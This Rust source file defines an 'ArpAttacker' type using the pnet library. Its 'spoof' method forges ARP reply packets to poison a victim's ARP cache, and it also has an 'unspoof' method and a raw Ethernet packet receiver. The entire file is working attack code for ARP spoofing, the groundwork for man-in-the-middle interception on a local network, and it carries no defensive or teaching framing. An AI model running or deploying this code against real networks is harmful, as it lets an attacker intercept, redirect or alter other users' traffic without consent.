use std::net::Ipv4Addr;

use anyhow::{anyhow, Result};
use pnet::{
    datalink::{self, Channel, DataLinkReceiver, DataLinkSender, NetworkInterface},
    ipnetwork::IpNetwork,
    packet::{
        arp::{
            ArpHardwareTypes::{self},
            ArpOperations, ArpPacket, MutableArpPacket,
        },
        ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket},
        Packet,
    },
    util::MacAddr,
};

pub struct ArpAttacker {
    tx: Box<dyn DataLinkSender>,
    rx: Box<dyn DataLinkReceiver>,
    iface: NetworkInterface,
    ip: Ipv4Addr,
    mac: MacAddr,
}

impl ArpAttacker {
    pub fn new(iface: &NetworkInterface) -> Result<Self> {
        let ip = iface
            .ips
            .iter()
            .find_map(|ip| match ip {
                IpNetwork::V4(v4) => Some(v4),
                _ => None,
            })
            .ok_or(anyhow!("didn't find a ipv4 address on interface"))?
            .ip();
        let mac = iface
            .mac
            .ok_or(anyhow!("didn't find a mac address on interface"))?;
        match datalink::channel(iface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => Ok(Self {
                tx,
                rx,
                iface: iface.clone(),
                ip,
                mac,
            }),
            Ok(_) => Err(anyhow!("unsupported datalink channel type")),
            Err(e) => Err(anyhow!("failed to create datalink channel: {}", e)),
        }
    }

    /// poison the arp cache of source
    /// source: victim
    /// target: target of the victim to spoof
    pub fn spoof(
        &mut self,
        source: (Ipv4Addr, MacAddr),
        target: (Ipv4Addr, MacAddr),
    ) -> Result<()> {
        let mut eth_buffer = [0u8; 42];
        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
            .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
        eth_packet.set_source(self.mac);
        eth_packet.set_destination(target.1);
        eth_packet.set_ethertype(EtherTypes::Arp);
        let mut arp_buffer = [0u8; 28];
        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
            .ok_or(anyhow!("MutableArpPacket returned None"))?;
        mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
        mut_arp_packet.set_hw_addr_len(6);
        mut_arp_packet.set_proto_addr_len(4);
        mut_arp_packet.set_sender_hw_addr(self.mac);
        mut_arp_packet.set_target_hw_addr(source.1);
        mut_arp_packet.set_sender_proto_addr(target.0);
        mut_arp_packet.set_target_proto_addr(source.0);
        mut_arp_packet.set_operation(ArpOperations::Reply);
        let arp_packet =
            ArpPacket::new(mut_arp_packet.packet()).ok_or(anyhow!("ArpPacket returned None"))?;
        eth_packet.set_payload(arp_packet.packet());
        self.tx
            .send_to(eth_packet.packet(), Some(self.iface.clone()));
        Ok(())
    }

    /// Unpoison the arp cache of source
    /// source: victim
    /// target: target of the victim to spoof
    pub fn unspoof(
        &mut self,
        source: (Ipv4Addr, MacAddr),
        target: (Ipv4Addr, MacAddr),
    ) -> Result<()> {
        let mut eth_buffer = [0u8; 42];
        let mut eth_packet = MutableEthernetPacket::new(&mut eth_buffer)
            .ok_or(anyhow!("MutableEthernetPacket returned None"))?;
        eth_packet.set_source(self.mac);
        eth_packet.set_destination(source.1);
        eth_packet.set_ethertype(EtherTypes::Arp);
        let mut arp_buffer = [0u8; 28];
        let mut mut_arp_packet = MutableArpPacket::new(&mut arp_buffer)
            .ok_or(anyhow!("MutableArpPacket returned None"))?;
        mut_arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
        mut_arp_packet.set_protocol_type(EtherTypes::Ipv4);
        mut_arp_packet.set_hw_addr_len(6);
        mut_arp_packet.set_proto_addr_len(4);
        mut_arp_packet.set_sender_hw_addr(self.mac);
        mut_arp_packet.set_target_hw_addr(target.1);
        mut_arp_packet.set_sender_proto_addr(self.ip);
        mut_arp_packet.set_target_proto_addr(target.0);
        mut_arp_packet.set_operation(ArpOperations::Reply);
        let arp_packet =
            ArpPacket::new(mut_arp_packet.packet()).ok_or(anyhow!("ArpPacket returned None"))?;
        eth_packet.set_payload(arp_packet.packet());
        self.tx
            .send_to(eth_packet.packet(), Some(self.iface.clone()));
        Ok(())
    }

    pub fn recv(&mut self) -> Result<EthernetPacket> {
        let buffer = self.rx.next()?.to_owned();
        let p: EthernetPacket = EthernetPacket::owned(buffer)
            .ok_or(anyhow!("failed to parse ethernet packet from raw data"))?;
        Ok(p)
    }
}
